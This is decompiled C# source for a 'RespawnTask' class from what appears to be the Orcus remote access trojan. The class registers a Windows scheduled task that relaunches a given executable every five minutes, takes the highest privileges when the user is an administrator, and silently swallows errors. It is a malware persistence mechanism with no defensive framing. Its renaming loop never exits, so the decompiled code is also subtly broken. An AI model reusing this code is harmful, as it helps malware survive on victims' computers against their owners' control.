using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32.TaskScheduler;
using Orcus.Config;
using Orcus.Shared.Settings;
using Orcus.Utilities;

namespace Orcus.Protection;

public static class RespawnTask
{
	private static bool _isRegistered;

	public static void RegisterRespawnTask(string filename, string taskName)
	{
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		if (_isRegistered)
		{
			return;
		}
		try
		{
			try
			{
				TaskService.get_Instance().get_RootFolder().DeleteTask(taskName, false);
			}
			catch (Exception)
			{
				int num = 1;
				while (true)
				{
					string newName = taskName + " (" + num + ")";
					if (((IEnumerable<Task>)TaskService.get_Instance().get_RootFolder().get_Tasks()).Any((Task x) => string.Equals(x.get_Name(), newName, StringComparison.OrdinalIgnoreCase)))
					{
						try
						{
							TaskService.get_Instance().get_RootFolder().DeleteTask(newName, false);
						}
						catch (Exception)
						{
							goto IL_0080;
						}
					}
					taskName = newName;
					goto IL_0080;
					IL_0080:
					num++;
				}
			}
			TaskDefinition val = TaskService.get_Instance().NewTask();
			RegistrationTrigger val2 = new RegistrationTrigger();
			((Trigger)val2).get_Repetition().set_Interval(TimeSpan.FromMinutes(5.0));
			((Trigger)val2).get_Repetition().set_StopAtDurationEnd(false);
			val.get_Triggers().Add((Trigger)(object)val2);
			val.get_Actions().Add(filename, (string)null, (string)null);
			if (CoreHelper.RunningOnVistaOrGreater && User.IsAdministrator)
			{
				val.get_Principal().set_RunLevel((TaskRunLevel)1);
			}
			TaskService.get_Instance().get_RootFolder().RegisterTaskDefinition(taskName, val);
			_isRegistered = true;
		}
		catch (Exception)
		{
		}
	}

	public static void RemoveRespawnTask()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		TaskService val = new TaskService();
		try
		{
			val.get_RootFolder().DeleteTask(Settings.GetBuilderProperty<RespawnTaskBuilderProperty>().get_TaskName(), false);
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}
}
